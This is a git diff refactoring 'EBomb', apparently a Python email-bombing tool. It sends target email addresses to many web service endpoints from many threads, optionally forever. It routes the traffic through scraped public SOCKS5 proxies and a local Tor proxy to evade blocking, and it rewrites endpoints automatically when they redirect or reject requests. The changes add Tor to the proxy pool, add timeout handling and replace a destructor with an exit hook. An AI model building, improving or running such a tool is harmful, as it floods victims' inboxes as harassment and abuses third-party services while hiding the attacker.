@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import atexit
 import json
 import multiprocessing
 import reprlib
@@ -19,6 +20,11 @@ __all__ = ('EBomb', 'Service', 'services')
 
 
 class EBomb:
+    __slots__ = ('console',
+                 'targets', 'forever',
+                 '_max_netloc_len', '_max_email_len', '_max_right_align', '_repr',
+                 '__proxies', '_working_proxy', 'proxy')
+
     class _Markup:
         """Contain colors for rich print"""
         __slots__ = ('service', 'method', 'proxy', 'response')
@@ -26,14 +32,8 @@ class EBomb:
         def __init__(self):
             self.service = self.method = self.proxy = self.response = 'green'
 
-    class _Repr(reprlib.Repr):
-        __slots__ = ('maxother',)
-
-        def __init__(self, max_right_align: int):
-            super().__init__()
-            self.maxother = max(shutil.get_terminal_size().columns - max_right_align, 6)
-
-    def __init__(self, targets: list[str], proxy: bool = True, forever: bool = True, verbose: bool = True):
+    def __init__(self, targets: list[str],
+                 proxy: bool = True, forever: bool = True, verbose: bool = True):
         self.console = Console()
         self.console.quiet = not verbose
 
@@ -42,10 +42,12 @@ class EBomb:
             return
 
         self.forever = forever
-        self._max_netloc_len = max(len(serv.netloc or '') for serv in services)
-        self._max_email_len = max(len(e) for e in targets)
 
-        self._repr = self._Repr(70 + self._max_netloc_len + self._max_email_len)
+        self._max_netloc_len = max(len(serv.netloc) for serv in services)
+        self._max_email_len = max(len(e) for e in targets)
+        self._max_right_align = 70 + self._max_netloc_len + self._max_email_len
+
+        self._repr = reprlib.Repr()
 
         if proxy:
             self.__proxies = self._socks5_proxies
@@ -54,6 +56,12 @@ class EBomb:
             self._working_proxy = None
             self.__proxies = {*()}
         self.proxy = proxy
+
+        def _at_exit():
+            with open(JSON_DB_FILE_PATH, 'w', encoding='UTF-8') as update_json:
+                json.dump([(serv.method, serv.url) for serv in services], update_json)
+
+        atexit.register(_at_exit)
 
     def start(self, threads_count: int = None):
         if threads_count is None:
@@ -68,17 +76,18 @@ class EBomb:
         args = [(service, email) for email in self.targets for service in services]
 
         self.console.print(
-            f"[blue][italic]Running "
-            f"{'[green]forever[/green]' if self.forever else f'on [green]{len(args)}[/green] calls'} "
-            f"([green]{threads_count}[/green] thread{'s' if threads_count != 1 else ''})... "
-            "[bold red]CTRL+BREAK[/bold red] to exit.[/italic]\n"
-            f"URL{'s' if _urls > 1 else ''}: [{_n_urls_color}]{_urls}[/{_n_urls_color}] "
-            f"[italic]([{_n_urls_color}]{UNIQUE_NETLOC}[/{_n_urls_color}] service{'s' if UNIQUE_NETLOC > 1 else ''})"
-            "[/italic]\n"
-            f"Proxy: [{_proxy_color}]{self.proxy}[/{_proxy_color}]\n"
-            f"Email{'s' if len(self.targets) > 1 else ''}: [yellow]{'; '.join(f'{i}' for i in self.targets)}[/yellow]\n"
+            f"[blue][i]Running "
+            f"{'[green]forever[/]' if self.forever else f'on [green]{len(args)}[/] calls'} "
+            f"([green]{threads_count}[/] thread{'s' if threads_count != 1 else ''})... "
+            "[b red]CTRL+BREAK[/] to exit.[/]\n"
+            f"URL{'s' if _urls > 1 else ''}: [{_n_urls_color}]{_urls}[/] "
+            f"[i]([{_n_urls_color}]{UNIQUE_NETLOC}[/] service{'s' if UNIQUE_NETLOC > 1 else ''})"
+            "[/]\n"
+            f"Proxy: [{_proxy_color}]{self.proxy}[/]\n"
+            f"Email{'s' if len(self.targets) > 1 else ''}: [yellow]{'; '.join(f'{i}' for i in self.targets)}[/]\n"
             f"{'HOST':^{self._max_netloc_len}} / METH | {'EMAIL':^{self._max_email_len}}"
-            f"{' |         PROXY         ' if self.proxy else ''} | RESPONSE[/blue]"
+            f"{' |         PROXY         ' if self.proxy else ''} | RESPONSE"
+            "[/blue]"
         )
 
         if threads_count == 1:
@@ -99,19 +108,20 @@ class EBomb:
     @property
     def _socks5_proxies(self) -> set[str]:
         try:
-            return {*(EasyProxies.Proxies.get(format='txt', type='socks5', uptime=100)
+            return {'localhost:9050',
+                    *(EasyProxies.Proxies.get(format='txt', type='socks5', uptime=100)
                       or EasyProxies.Proxies.get(format='txt', type='socks5'))}
-        except URLError:
+        except (URLError, TimeoutError):
             pass
         try:
-            return {str(i) for i in spys.me.Getters.get_socks5_proxies()}
+            return {'localhost:9050', *(str(i) for i in spys.me.Getters.get_socks5_proxies())}
         except Exception as e:
             self.console.log('Getting proxies error:', e)
             sys.exit(1)
 
     @property
     def working_proxy(self):
-        if not (self._working_proxy and self._working_proxy in self.proxies):
+        if self._working_proxy and self._working_proxy not in self.proxies:
             self._working_proxy = sorted(self.proxies)[0]
         return self._working_proxy
 
@@ -121,6 +131,11 @@ class EBomb:
             self.__proxies |= self._socks5_proxies
         return self.__proxies
 
+    @property
+    def _max_other(self) -> int:
+        """reprlib.Repr.maxother"""
+        return max(shutil.get_terminal_size().columns - self._max_right_align, 6)
+
     def request(self, service: Service, email: str):
         _proxy = self.working_proxy
         _markup = self._Markup()
@@ -129,12 +144,15 @@ class EBomb:
             code = resp.status_code
         except RequestException as Error:
             _markup.response = 'italic red'
+
+            self._repr.maxother = self._max_other
             resp = self._repr.repr(Error)
+
             code = None if Error.response is None else Error.response.status_code
-        if service in services and code in (301, 308, 403, 404, 405):
+        if service in services and code in {301, 308, 403, 404, 405}:
             _markup.response = 'yellow'
             pos = services.index(service)
-            if code in (301, 308):
+            if code in {301, 308}:
                 new_loc = resp.headers.get('Location') if resp is not None else None
                 if new_loc:
                     _markup.service = 'italic green'
@@ -156,7 +174,7 @@ class EBomb:
                 else:
                     _markup.method = 'italic red'
                     services.append(Service(service.url, 'GET'))
-        elif code in (None, 401, 407):
+        elif code in {None, 401, 407}:
             _markup.proxy = 'red'
             proxies = self.proxies
             if _proxy in proxies:
@@ -170,7 +188,3 @@ class EBomb:
             f'| [{_markup.response}]{resp}[/{_markup.response}]'
             '[/white]'
         )
-
-    def __del__(self):
-        with open(JSON_DB_FILE_PATH, 'w', encoding='UTF-8') as update_json:
-            json.dump([{'url': serv.url, 'method': serv.method} for serv in services], update_json)
